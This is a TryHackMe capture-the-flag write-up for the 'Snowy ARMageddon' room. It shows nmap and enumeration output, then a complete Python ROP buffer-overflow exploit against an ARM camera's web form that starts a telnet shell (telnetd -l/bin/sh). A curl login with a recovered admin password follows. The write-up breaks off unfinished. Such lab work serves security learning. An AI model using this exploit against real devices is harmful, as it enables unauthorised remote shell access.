# Snowy ARMageddon
## Difficulty Insane
Assist the Yeti in breaching the cyber police perimeter!

## NMAP 
```bash
nmap -Pn -p- --min-rate=1000 10.201.110.39 -oN nmap_report
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 11:22 WIB
Warning: 10.201.110.39 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.201.110.39
Host is up (0.35s latency).
Not shown: 63770 closed tcp ports (reset), 1761 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 204.06 seconds

```
## Enumeration
- Visit `10.201.110.39:8080`
```txt

Oops! Access is strictly forbidden for non-elves.

Maybe try the nice list next year!
```

```bash
telnet 10.201.44.36 23

Trying 10.201.44.36...
Connected to 10.201.44.36.
Escape character is '^]'.
Connection closed by foreign host.
```
- Visit `10.201.110.39:50628`
- Using Exploit

```py
#!/usr/bin/python
from telnetlib import Telnet
import os, struct, sys, re, socket
import time

##### HELPER FUNCTIONS #####

def pack32(value):
    return struct.pack("<I", value)  # little byte order

def pack16n(value):
    return struct.pack(">H", value)  # big/network byte order

def urlencode(buf):
    s = ""
    for b in buf:
        if re.match(r"[a-zA-Z0-9\/]", b) is None:
            s += "%%%02X" % ord(b)
        else:
            s += b
    return s

##### HELPER FUNCTIONS FOR ROP CHAINING #####

# function to create a libc gadget
# requires a global variable called libc_base
def libc(offset):
    return pack32(libc_base + offset)

# function to represent data on the stack
def data(data):
    return pack32(data)

# function to check for bad characters
# run this before sending out the payload
# e.g. detect_badchars(payload, "\x00\x0a\x0d/?")
def detect_badchars(string, badchars):
    for badchar in badchars:
        i = string.find(badchar)
        while i != -1:
            sys.stderr.write("[!] 0x%02x appears at position %d\n" % (ord(badchar), i))
            i = string.find(badchar, i+1)

##### MAIN #####

if len(sys.argv) != 3:
    print("Usage: expl.py <ip> <port>")
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]

libc_base = 0x40021000

buf = b"A" * 284

"""
0x40060b58 <+32>:    ldr     r0, [sp, #4]
0x40060b5c <+36>:    pop     {r1, r2, r3, lr}
0x40060b60 <+40>:    bx      lr
"""
ldr_r0_sp = pack32(0x40060b58)

# 0x00033a98: mov r0, sp; mov lr, pc; bx r3;
mov_r0 = pack32(libc_base + 0x00033a98)
system = pack32(0x4006079c)

buf += ldr_r0_sp


buf += b"BBBB"
buf += b"CCCC"
buf += system
buf += mov_r0
buf += b"telnetd${IFS}-l/bin/sh;#"

buf += b"C" * (400-len(buf))

lang = buf

request = b"GET /form/liveRedirect?lang=%s HTTP/1.0\n" % lang + \
    b"Host: BBBBBBBBBBBB\nUser-Agent: ARM/exploitlab\n\n"
print(request)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, int(port)))
s.send(request)
s.recv(100)

time.sleep(2)
tn = Telnet(ip, 23)
tn.interact()
```

```bash
curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.201.44.36:8080/ -L 
<!DOCTYPE html>
<html lang="en" class="h-full bg-thm-800">
  <head>
    <meta charset="UTF-8" />
    <link
      rel="icon"
      type="image/png"
      href="https://assets.tryhackme.com/img/favicon.png"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TryHackMe | Access Forbidden - 403</title>
    <link rel="stylesheet" href="/styles.css" />
  </head>

  <body class="h-full bg-thm-900">
    <div
      class="min-h-full flex flex-col items-center justify-center text-thm-50"
    >
      
      <div class="px-2 text-center w-full">
        <h1 class="text-4xl">
          Oops! Access is strictly forbidden for non-elves.
        </h1>
        <p class="text-gray-200 my-4">Maybe try the nice list next year!</p>
      </div>
      <img
        src="/403.png"
        alt="403"
        class="w-full h-full max-w-3xl shadow-xl shadow-black/40"
      />
    </div>
  </body>
</html>
```
## SORRY THE NEXT STEPS WERE NOT CAPTURED